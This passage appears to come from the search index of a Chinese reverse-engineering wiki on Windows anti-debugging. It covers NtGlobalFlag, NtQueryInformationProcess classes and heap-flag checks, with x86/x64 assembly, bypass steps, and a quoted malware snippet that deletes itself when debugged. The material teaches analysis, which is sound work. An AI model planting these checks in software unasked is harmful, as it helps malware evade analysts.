\u7136\u800c\u6ce8\u518c\u8868\u4e2d\u7684\u952e\u503c\u4e8b\u5148\u5df2\u7ecf\u66ff\u6362\u5e76\u4e14\u5c1a\u672a\u91cd\u542f\u751f\u6548. \u90a3\u4e48\u8c03\u8bd5\u5668\u53ea\u662f\u590d\u5236\u4e86\u4e00\u4e2a\u5047\u7684\u503c, \u800c\u975e\u771f\u6b63\u9700\u8981\u7684\u90a3\u4e2a. \u5982\u679c\u7a0b\u5e8f\u77e5\u9053\u771f\u6b63\u7684\u503c\u800c\u975e\u6ce8\u518c\u8868\u4e2d\u7684\u90a3\u4e2a\u5047\u7684\u503c, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bdf\u89c9\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728. \u5f53\u7136\u8c03\u8bd5\u5668\u4e5f\u53ef\u4ee5\u8fd0\u884c\u5176\u4ed6\u8fdb\u7a0b\u7136\u540e\u67e5\u8be2 NtGlobalFlag \u5b57\u6bb5\u6765\u83b7\u53d6\u771f\u6b63\u7684\u503c. \u4f9d\u65e7\u662f GlobalFlag , \u4e0d\u8fc7\u8fd9\u91cc\u7684\u662f HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<filename> . (\u6620\u50cf\u52ab\u6301), \u8fd9\u91cc\u9700\u8981\u5c06 <filename> \u66ff\u6362\u4e3a\u9700\u8981\u66f4\u6539\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u540d(\u4e0d\u9700\u8981\u6307\u5b9a\u8def\u5f84). \u8bbe\u7f6e\u597d GlobalFlag \u540e, \u7cfb\u7edf\u4f1a\u5c06\u5176\u503c\u8986\u76d6\u5230 NtGlobalFlag \u5b57\u6bb5(\u53ea\u5355\u72ec\u4e3a\u6307\u5b9a\u7684\u8fdb\u7a0b\u8986\u76d6). \u4e0d\u8fc7\u4e5f\u8fd8\u662f\u53ef\u4ee5\u518d\u6b21\u7531Windows\u6539\u53d8(\u89c1\u4e0b). \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u7684\u4e24\u4e2a\u5b57\u6bb5: GlobalFlagsClear \u548c GlobalFlagsSet . GlobalFlagsClear \u5217\u51fa\u9700\u8981\u6e05\u7a7a\u7684\u6807\u5fd7\u4f4d, \u800c GlobalFlagsSet \u5219\u5217\u51fa\u9700\u8981\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d, \u8fd9\u4e9b\u8bbe\u7f6e\u4f1a\u5728 GlobalFlag \u5e94\u7528\u4e4b\u540e\u518d\u751f\u6548, \u56e0\u6b64\u5b83\u53ef\u4ee5\u8986\u76d6\u6389 GlobalFlag \u6307\u5b9a\u7684\u503c. \u7136\u800c\u5b83\u65e0\u6cd5\u8986\u76d6\u6389Windows\u6307\u5b9a\u8bbe\u7f6e\u7684\u6807\u5fd7\u4f4d. \u6bd4\u5982\u8bbe\u7f6e FLG_USER_STACK_TRACE_DB (0x1000) \u53ef\u4ee5\u8ba9Windows\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u6807\u5fd7\u4f4d, \u5c31\u7b97 FLG_HEAP_VALIDATE_PARAMETERS \u5728\u52a0\u8f7d\u914d\u7f6e\u8868( Load Configuration Table )\u4e2d\u88ab\u6e05\u7a7a\u4e86, Windows\u4e5f\u4f1a\u5728\u968f\u540e\u7684\u8fdb\u7a0b\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u91cd\u65b0\u8bbe\u7f6e. \u5f53\u8c03\u8bd5\u5668\u521b\u5efa\u8fdb\u7a0b\u65f6, Windows\u4f1a\u505a\u51fa\u4e00\u4e9b\u6539\u53d8. \u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u4e2d\u7684 _NO_DEBUG_HEAP , NtGlobalFlag \u5c06\u4f1a\u56e0\u4e3a\u8c03\u8bd5\u5668\u800c\u4e0d\u4f1a\u8bbe\u7f6e\u5176\u4e2d\u76843\u4e2a\u5806\u7684\u6807\u5fd7\u4f4d. \u5f53\u7136\u5b83\u4eec\u4f9d\u65e7\u53ef\u4ee5\u901a\u8fc7 GlobalFlag \u6216\u52a0\u8f7d\u914d\u7f6e\u8868\u4e2d\u7684 GlobalFlagsSet \u7ee7\u7eed\u8bbe\u7f6e.","title":"\u6539\u53d8NtGlobalFlag\u521d\u503c"},{"location":"reverse/anti-debug/ntglobalflag/#_2","text":"\u6709\u4ee5\u4e0b3\u79cd\u65b9\u6cd5\u6765\u7ed5\u8fc7 NtGlobalFlag \u7684\u68c0\u6d4b \u624b\u52a8\u4fee\u6539\u6807\u5fd7\u4f4d\u7684\u503c( FLG_HEAP_ENABLE_TAIL_CHECK , FLG_HEAP_ENABLE_FREE_CHECK , FLG_HEAP_VALIDATE_PARAMETERS ) \u5728Ollydbg\u4e2d\u4f7f\u7528 hide-debug \u63d2\u4ef6 \u5728Windbg\u7981\u7528\u8c03\u8bd5\u5806\u7684\u65b9\u5f0f\u542f\u52a8\u7a0b\u5e8f( windbg -hd program.exe )","title":"\u5982\u4f55\u7ed5\u8fc7\u68c0\u6d4b?"},{"location":"reverse/anti-debug/ntglobalflag/#_3","text":"\u4ee5\u4e0b\u662f\u4e00\u4e2a\u6f14\u793a\u5982\u4f55\u624b\u52a8\u7ed5\u8fc7\u68c0\u6d4b\u7684\u793a\u4f8b .text: 00403594 64 A1 30 00 00 00 mov eax , large fs : 30 h ; PEB struct loaded into EAX .text : 0040359 A db 3 Eh ; IDA Pro display error (the byte is actually used in the next instruction) .text : 0040359 A 3 E 8 B 40 68 mov eax , [ eax + 68 h ] ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX .text : 0040359 E 83 E8 70 sub eax , 70 h ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS) .text : 004035 A1 89 85 D8 E7 FF FF mov [ ebp + var_1828 ], eax .text: 004035 A7 83 BD D8 E7 FF FF 00 cmp [ ebp + var_1828 ], 0 ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged) .text : 004035 AE 75 05 jnz short loc_4035B5 ; No debugger, program continues... .text : 004035 B0 E8 4 B DA FF FF call s_selfDelete ; ...else, malware deleted \u5728Ollydbg\u4e2d\u5728\u504f\u79fb 0x40359A \u8bbe\u7f6e\u65ad\u70b9, \u8fd0\u884c\u7a0b\u5e8f\u89e6\u53d1\u65ad\u70b9. \u7136\u540e\u6253\u5f00 CommandLine \u63d2\u4ef6\u7528 dump fs:[30]+0x68 dump\u51fa NtGlobalFlag \u7684\u5185\u5bb9 \u53f3\u952e\u9009\u62e9 Binary->Fill with 00's \u5c06\u503c 0x70 \u66ff\u6362\u4e3a 0x00 \u5373\u53ef.","title":"\u624b\u52a8\u7ed5\u8fc7\u793a\u4f8b"},{"location":"reverse/anti-debug/ntglobalflag/#_4","text":"The \"Ultimate\" Anti-Debugging Reference PEB-Process-Environment-Block/NtGlobalFlag","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"reverse/anti-debug/ntqueryinformationprocess/","text":"NTSTATUS WINAPI NtQueryInformationProcess ( _In_ HANDLE ProcessHandle , _In_ PROCESSINFOCLASS ProcessInformationClass , _Out_ PVOID ProcessInformation , _In_ ULONG ProcessInformationLength , _Out_opt_ PULONG ReturnLength ); ProcessDebugPort \u00b6 \u672a\u516c\u5f00\u7684 ntdll \u7684 NtQueryInformationProcess() \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4fe1\u606f\u7c7b\u7684\u53c2\u6570\u7528\u4e8e\u67e5\u8be2. ProcessDebugPort(7) \u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u4fe1\u606f\u7c7b. kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u5185\u90e8\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess() \u6765\u68c0\u6d4b\u8c03\u8bd5, \u800c NtQueryInformationProcess \u5185\u90e8\u5219\u662f\u67e5\u8be2 EPROCESS \u7ed3\u6784\u4f53\u7684 DebugPort \u5b57\u6bb5, \u5f53\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u65f6, \u8fd4\u56de\u503c\u4e3a 0xffffffff . \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push eax mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 7 ;ProcessDebugPort push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax inc eax je being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 7 ;ProcessDebugPort pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp jne being_debugged \u7531\u4e8e\u4fe1\u606f\u4f20\u81ea\u5185\u6838, \u6240\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4ee3\u7801\u6ca1\u6709\u8f7b\u677e\u7684\u65b9\u6cd5\u963b\u6b62\u8be5\u51fd\u6570\u68c0\u6d4b\u8c03\u8bd5\u5668. ProcessDebugObjectHandle \u00b6 Windows XP\u5f15\u5165\u4e86 debug\u5bf9\u8c61 , \u5f53\u4e00\u4e2a\u8c03\u8bd5\u4f1a\u8bdd\u542f\u52a8, \u4f1a\u540c\u65f6\u521b\u5efa\u4e00\u4e2a debug \u5bf9\u8c61\u4ee5\u53ca\u4e0e\u4e4b\u5173\u8054\u7684\u53e5\u67c4. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ProcessDebugObjectHandle (0x1e) \u7c7b\u6765\u67e5\u8be2\u8fd9\u4e2a\u53e5\u67c4\u7684\u503c \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push 0 mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 1 eh ;ProcessDebugObjectHandle push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax , eax jne being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 1 eh ;ProcessDebugObjectHandle pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp jne being_debugged ProcessDebugFlags \u00b6 ProcessDebugFlags (0x1f) \u7c7b\u8fd4\u56de EPROCESS \u7ed3\u6784\u4f53\u7684 NoDebugInherit \u7684\u76f8\u53cd\u6570. \u610f\u601d\u662f, \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u8fd4\u56de\u503c\u4e3a 0 , \u4e0d\u5b58\u5728\u65f6\u5219\u8fd4\u56de 1 . \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push eax mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 1 fh ;ProcessDebugFlags push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax , eax je being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 4 ;ProcessInformationLength pop r9 push rbp pop r8 push 1 fh ;ProcessDebugFlags pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp je being_debugged","title":"NtQueryInformationProcess"},{"location":"reverse/anti-debug/ntqueryinformationprocess/#processdebugport","text":"\u672a\u516c\u5f00\u7684 ntdll \u7684 NtQueryInformationProcess() \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4fe1\u606f\u7c7b\u7684\u53c2\u6570\u7528\u4e8e\u67e5\u8be2. ProcessDebugPort(7) \u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u4fe1\u606f\u7c7b. kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u5185\u90e8\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess() \u6765\u68c0\u6d4b\u8c03\u8bd5, \u800c NtQueryInformationProcess \u5185\u90e8\u5219\u662f\u67e5\u8be2 EPROCESS \u7ed3\u6784\u4f53\u7684 DebugPort \u5b57\u6bb5, \u5f53\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u65f6, \u8fd4\u56de\u503c\u4e3a 0xffffffff . \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push eax mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 7 ;ProcessDebugPort push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax inc eax je being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 7 ;ProcessDebugPort pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp jne being_debugged \u7531\u4e8e\u4fe1\u606f\u4f20\u81ea\u5185\u6838, \u6240\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4ee3\u7801\u6ca1\u6709\u8f7b\u677e\u7684\u65b9\u6cd5\u963b\u6b62\u8be5\u51fd\u6570\u68c0\u6d4b\u8c03\u8bd5\u5668.","title":"ProcessDebugPort"},{"location":"reverse/anti-debug/ntqueryinformationprocess/#processdebugobjecthandle","text":"Windows XP\u5f15\u5165\u4e86 debug\u5bf9\u8c61 , \u5f53\u4e00\u4e2a\u8c03\u8bd5\u4f1a\u8bdd\u542f\u52a8, \u4f1a\u540c\u65f6\u521b\u5efa\u4e00\u4e2a debug \u5bf9\u8c61\u4ee5\u53ca\u4e0e\u4e4b\u5173\u8054\u7684\u53e5\u67c4. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ProcessDebugObjectHandle (0x1e) \u7c7b\u6765\u67e5\u8be2\u8fd9\u4e2a\u53e5\u67c4\u7684\u503c \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push 0 mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 1 eh ;ProcessDebugObjectHandle push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax , eax jne being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 8 ;ProcessInformationLength pop r9 push rbp pop r8 push 1 eh ;ProcessDebugObjectHandle pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp jne being_debugged","title":"ProcessDebugObjectHandle"},{"location":"reverse/anti-debug/ntqueryinformationprocess/#processdebugflags","text":"ProcessDebugFlags (0x1f) \u7c7b\u8fd4\u56de EPROCESS \u7ed3\u6784\u4f53\u7684 NoDebugInherit \u7684\u76f8\u53cd\u6570. \u610f\u601d\u662f, \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u8fd4\u56de\u503c\u4e3a 0 , \u4e0d\u5b58\u5728\u65f6\u5219\u8fd4\u56de 1 . \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u572832\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: push eax mov eax , esp push 0 push 4 ;ProcessInformationLength push eax push 1 fh ;ProcessDebugFlags push - 1 ;GetCurrentProcess() call NtQueryInformationProcess pop eax test eax , eax je being_debugged \u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u572864\u4f4d\u73af\u5883\u8fdb\u884c\u68c0\u6d4b: xor ebp , ebp enter 20 h , 0 push 4 ;ProcessInformationLength pop r9 push rbp pop r8 push 1 fh ;ProcessDebugFlags pop rdx or rcx , - 1 ;GetCurrentProcess() call NtQueryInformationProcess leave test ebp , ebp je being_debugged","title":"ProcessDebugFlags"},{"location":"reverse/anti-debug/the-heap/","text":"\u5806\u5728\u521d\u59cb\u5316\u65f6, \u4f1a\u68c0\u67e5 heap flags , \u5e76\u89c6\u4e00\u4e9b\u6807\u5fd7\u4f4d\u7684\u6709\u65e0\u8bbe\u7f6e\u800c\u5bf9\u73af\u5883\u4f5c\u51fa\u989d\u5916\u7684\u6539\u53d8. \u50cf Themida \u5c31\u6709\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668. \u6bd4\u5982: \u5982\u679c\u8bbe\u7f6e\u4e86 HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7(\u89c1 Heap Flags \u8282), \u90a3\u4e48\u572832\u4f4dwindows\u4e2d\u5c31\u4f1a\u5728\u5206\u914d\u7684\u5806\u5757\u5c3e\u90e8\u9644\u52a02\u4e2a 0xABABABAB (64\u4f4d\u73af\u5883\u5c31\u662f4\u4e2a). \u5982\u679c\u8bbe\u7f6e\u4e86 HEAP_FREE_CHECKING_ENABLED (\u89c1 Heap Flags \u8282)\u6807\u5fd7, \u90a3\u4e48\u5f53\u9700\u8981\u989d\u5916\u7684\u5b57\u8282\u6765\u586b\u5145\u5806\u5757\u5c3e\u90e8\u65f6, \u5c31\u4f1a\u4f7f\u7528 0xFEEEFEEE (\u6216\u4e00\u90e8\u5206)\u6765\u586b\u5145 \u90a3\u4e48, \u4e00\u79cd\u65b0\u7684\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5\u5c31\u662f\u6765\u68c0\u67e5\u8fd9\u4e9b\u503c. \u5806\u6307\u9488\u5df2\u77e5 \u00b6 \u5982\u679c\u5df2\u77e5\u4e00\u4e2a\u5806\u6307\u9488, \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u68c0\u67e5\u5806\u5757\u91cc\u7684\u6570\u636e. \u7136\u800c\u5728 Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u91c7\u7528\u4e86\u5806\u4fdd\u62a4\u673a\u5236(32\u4f4d/64\u4f4d\u90fd\u6709), \u4f7f\u7528\u4e86\u4e00\u4e2a\u5f02\u6216\u5bc6\u94a5\u6765\u5bf9\u5806\u5757\u5927\u5c0f\u8fdb\u884c\u4e86\u52a0\u5bc6. \u867d\u7136\u4f60\u53ef\u4ee5\u9009\u62e9\u662f\u5426\u4f7f\u7528\u5bc6\u94a5, \u4f46\u662f\u9ed8\u8ba4\u662f\u4f7f\u7528\u7684. \u800c\u4e14\u5c31\u5806\u5757\u9996\u90e8\u7684\u4f4d\u7f6e, \u5728 Windows NT/2000/XP \u548c Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c \u4e4b\u95f4\u4e5f\u662f\u4e0d\u76f8\u540c\u7684. \u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u5c06 Windows\u7248\u672c \u4e5f\u8003\u8651\u5728\u5185. \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883: xor ebx , ebx call GetVersion cmp al , 6 sbb ebp , ebp jb l1 ;Process Environment Block mov eax , fs :[ ebx + 30 h ] mov eax , [ eax + 18 h ] ;get process heap base mov ecx , [ eax + 24 h ] ;check for protected heap jecxz l1 mov ecx , [ ecx ] test [ eax + 4 ch ], ecx cmovne ebx , [ eax + 50 h ] ;conditionally get heap key l1 : mov eax , < heap ptr > movzx edx , w [ eax-8 ] ;size xor dx , bx movzx ecx , b [ eax + ebp-1 ] ;overhead sub eax , ecx lea edi , [ edx * 8 + eax ] mov al , 0 abh mov cl , 8 rep e scasb je being_debugged \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883: xor ebx, ebx call GetVersion cmp al, 6 sbb rbp, rbp jb l1 ;Process Environment Block mov rax, gs:[rbx+60h] mov eax, [rax+30h] ;get process heap base mov ecx, [rax+40h] ;check for protected heap jrcxz l1 mov ecx, [rcx+8] test [rax+7ch], ecx cmovne ebx, [rax+88h] ;conditionally get heap key l1: mov eax, <heap ptr> movzx edx, w [rax-8] ;size xor dx, bx add edx, edx movzx ecx, b [rax+rbp-1] ;overhead sub eax, ecx lea edi, [rdx*8+rax] mov al, 0abh mov cl, 10h repe scasb je being_debugged \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790. \u5806\u6307\u9488\u672a\u77e5 \u00b6 \u5982\u679c\u65e0\u6cd5\u5f97\u77e5\u5806\u6307\u9488, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32 \u7684 HeapWalk() \u51fd\u6570\u6216 ntdll \u7684 RtlWalkHeap() \u51fd\u6570(\u6216\u751a\u81f3\u662f kernel32 \u7684 GetCommandLine() \u51fd\u6570). \u8fd4\u56de\u7684\u5806\u5927\u5c0f\u7684\u503c\u4f1a\u88ab\u81ea\u52a8\u89e3\u5bc6, \u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u518d\u5173\u5fc3windows\u7684\u7248\u672c \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883: mov ebx , offset l2 ;get a pointer to a heap block l1: push ebx mov eax , fs :[ 30 h ] ;Process Environment Block push d [ eax + 18 h ] ;save process heap base call HeapWalk cmp w [ ebx + 0 ah ], 4 ;find allocated block jne l1 mov edi , [ ebx ] ;data pointer add edi , [ ebx + 4 ] ;data size mov al , 0 abh push 8 pop ecx rep e scasb je being_debugged ... l2: db 1 ch dup ( 0 ) ;sizeof(PROCESS_HEAP_ENTRY) \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883: mov rbx , offset l2 ;get a pointer to a heap block l1: push rbx pop rdx push 60 h pop rsi gs: lodsq ;Process Environment Block ;get a pointer to process heap base mov ecx , [ rax + 30 h ] call HeapWalk cmp w [ rbx + 0 eh ], 4 ;find allocated block jne l1 mov edi , [ rbx ] ;data pointer add edi , [ rbx + 8 ] ;data size mov al , 0 abh push 10 h pop rcx rep e scasb je being_debugged ... l2: db 28 h dup ( 0 ) ;sizeof(PROCESS_HEAP_ENTRY) \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.","title":"The Heap"},{"location":"reverse/anti-debug/the-heap/#_1","text":"\u5982\u679c\u5df2\u77e5\u4e00\u4e2a\u5806\u6307\u9488, \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u68c0\u67e5\u5806\u5757\u91cc\u7684\u6570\u636e. \u7136\u800c\u5728 Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u91c7\u7528\u4e86\u5806\u4fdd\u62a4\u673a\u5236(32\u4f4d/64\u4f4d\u90fd\u6709), \u4f7f\u7528\u4e86\u4e00\u4e2a\u5f02\u6216\u5bc6\u94a5\u6765\u5bf9\u5806\u5757\u5927\u5c0f\u8fdb\u884c\u4e86\u52a0\u5bc6. \u867d\u7136\u4f60\u53ef\u4ee5\u9009\u62e9\u662f\u5426\u4f7f\u7528\u5bc6\u94a5, \u4f46\u662f\u9ed8\u8ba4\u662f\u4f7f\u7528\u7684. \u800c\u4e14\u5c31\u5806\u5757\u9996\u90e8\u7684\u4f4d\u7f6e, \u5728 Windows NT/2000/XP \u548c Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c \u4e4b\u95f4\u4e5f\u662f\u4e0d\u76f8\u540c\u7684. \u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u5c06 Windows\u7248\u672c \u4e5f\u8003\u8651\u5728\u5185. \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883: xor ebx , ebx call GetVersion cmp al , 6 sbb ebp , ebp jb l1 ;Process Environment Block mov eax , fs :[ ebx + 30 h ] mov eax , [ eax + 18 h ] ;get process heap base mov ecx , [ eax + 24 h ] ;check for protected heap jecxz l1 mov ecx , [ ecx ] test [ eax + 4 ch ], ecx cmovne ebx , [ eax + 50 h ] ;conditionally get heap key l1 : mov eax , < heap ptr > movzx edx , w [ eax-8 ] ;size xor dx , bx movzx ecx , b [ eax + ebp-1 ] ;overhead sub eax , ecx lea edi , [ edx * 8 + eax ] mov al , 0 abh mov cl , 8 rep e scasb je being_debugged \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883: xor ebx, ebx call GetVersion cmp al, 6 sbb rbp, rbp jb l1 ;Process Environment Block mov rax, gs:[rbx+60h] mov eax, [rax+30h] ;get process heap base mov ecx, [rax+40h] ;check for protected heap jrcxz l1 mov ecx, [rcx+8] test [rax+7ch], ecx cmovne ebx, [rax+88h] ;conditionally get heap key l1: mov eax, <heap ptr> movzx edx, w [rax-8] ;size xor dx, bx add edx, edx movzx ecx, b [rax+rbp-1] ;overhead sub eax, ecx lea edi, [rdx*8+rax] mov al, 0abh mov cl, 10h repe scasb je being_debugged \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.","title":"\u5806\u6307\u9488\u5df2\u77e5"},{"location":"reverse/anti-debug/the-heap/#_2","text":"\u5982\u679c\u65e0\u6cd5\u5f97\u77e5\u5806\u6307\u9488, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32 \u7684 HeapWalk() \u51fd\u6570\u6216 ntdll \u7684 RtlWalkHeap() \u51fd\u6570(\u6216\u751a\u81f3\u662f kernel32 \u7684 GetCommandLine() \u51fd\u6570). \u8fd4\u56de\u7684\u5806\u5927\u5c0f\u7684\u503c\u4f1a\u88ab\u81ea\u52a8\u89e3\u5bc6, \u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u518d\u5173\u5fc3windows\u7684\u7248\u672c \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883: mov ebx , offset l2 ;get a pointer to a heap block l1: push ebx mov eax , fs :[ 30 h ] ;Process Environment Block push d [ eax + 18 h ] ;save process heap base call HeapWalk cmp w [ ebx + 0 ah ], 4 ;find allocated block jne l1 mov edi , [ ebx ] ;data pointer add edi , [ ebx + 4 ] ;data size mov al , 0 abh push 8 pop ecx rep e scasb je being_debugged ... l2: db 1 ch dup ( 0 ) ;sizeof(PROCESS_HEAP_ENTRY) \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883: mov rbx , offset l2 ;get a pointer to a heap block l1: push rbx pop rdx push 60 h pop rsi gs: lodsq ;Process Environment Block ;get a pointer to process heap base mov ecx , [ rax + 30 h ] call HeapWalk cmp w [ rbx + 0 eh ], 4 ;find allocated block jne l1 mov edi , [ rbx ] ;data pointer add edi , [ rbx + 8 ] ;data size mov al , 0 abh push 10 h pop rcx rep e scasb je being_debugged ... l2: db 28 h dup ( 0 ) ;sizeof(PROCESS_HEAP_ENTRY) \u8fd9\u91cc\u6ca1\u6709\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883\u7684\u6837\u4f8b, \u56e0\u4e3a64\u4f4d\u7684\u5806\u65e0\u6cd5\u753132\u4f4d\u7684\u5806\u51fd\u6570\u89e3\u6790.","title":"\u5806\u6307\u9488\u672a\u77e5"},{"location":"reverse/anti-debug/thread_local_storage/","text":"Thread Local Storage(TLS) \u00b6 \u7ebf\u7a0b\u672c\u5730\u5b58\u50a8(TLS)\u7528\u4e8e\u5728\u7ebf\u7a0b\u542f\u52a8\u524d\u5bf9\u7279\u5b9a\u7ebf\u7a0b\u6570\u636e\u8fdb\u884c\u521d\u59cb\u5316, \u56e0\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5305\u542b\u81f3\u5c111\u4e2a\u7ebf\u7a0b, \u5728\u4e3b\u7ebf\u7a0b\u8fd0\u884c\u524d\u521d\u59cb\u5316\u6570\u636e. 